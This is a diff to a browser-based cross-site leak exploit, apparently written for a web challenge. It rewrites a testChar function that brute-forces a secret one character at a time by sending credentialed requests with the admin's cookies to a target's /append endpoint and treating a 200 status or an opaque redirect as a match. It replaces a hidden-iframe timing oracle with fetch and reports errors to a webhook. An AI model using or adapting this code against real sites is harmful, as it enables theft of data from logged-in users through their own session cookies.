@@ -37,50 +37,34 @@
         }
 
         async function testChar(prefix, char) {
-            return new Promise((resolve) => {
-                attempts++;
-                const iframe = document.createElement('iframe');
-                const test = prefix + char;
-                
-                // The key: Status code affects response behavior
-                // 200 (match) vs 404 (no match)
-                iframe.src = `${TARGET}/append?content=${encodeURIComponent(test)}&url=${encodeURIComponent(TARGET + '/')}`;
-                
-                let resolved = false;
-                
-                // On successful load (likely means 200 status)
-                iframe.onload = () => {
-                    if (!resolved) {
-                        resolved = true;
-                        setTimeout(() => resolve(true), 100);
+            const test = prefix + char;
+            attempts++;
+            
+            try {
+                // Make request with credentials (admin cookie)
+                const response = await fetch(
+                    `${TARGET}/append?content=${encodeURIComponent(test)}&url=${encodeURIComponent(TARGET + '/')}`,
+                    {
+                        method: 'GET',
+                        credentials: 'include',
+                        redirect: 'manual' // Don't follow redirects
                     }
-                };
+                );
                 
-                // On error (might indicate different status)
-                iframe.onerror = () => {
-                    if (!resolved) {
-                        resolved = true;
-                        resolve(false);
-                    }
-                };
+                // Check status code
+                // 200 = match found
+                // 404 = no match
+                const isMatch = response.status === 200 || response.type === 'opaqueredirect';
                 
-                // Timeout as fallback
-                setTimeout(() => {
-                    if (!resolved) {
-                        resolved = true;
-                        resolve(false);
-                    }
-                    try { 
-                        document.body.removeChild(iframe); 
-                    } catch {}
-                }, 1500);
+                await new Promise(r => setTimeout(r, 50));
+                return isMatch;
                 
-                iframe.style.display = 'none';
-                iframe.style.position = 'absolute';
-                iframe.style.width = '1px';
-                iframe.style.height = '1px';
-                document.body.appendChild(iframe);
-            });
+            } catch (e) {
+                updateStatus(`Error testing ${test}: ${e.message}`);
+                await sendWebhook({ test_error: test, error: e.message });
+                await new Promise(r => setTimeout(r, 50));
+                return false;
+            }
         }
 
         async function extract() {
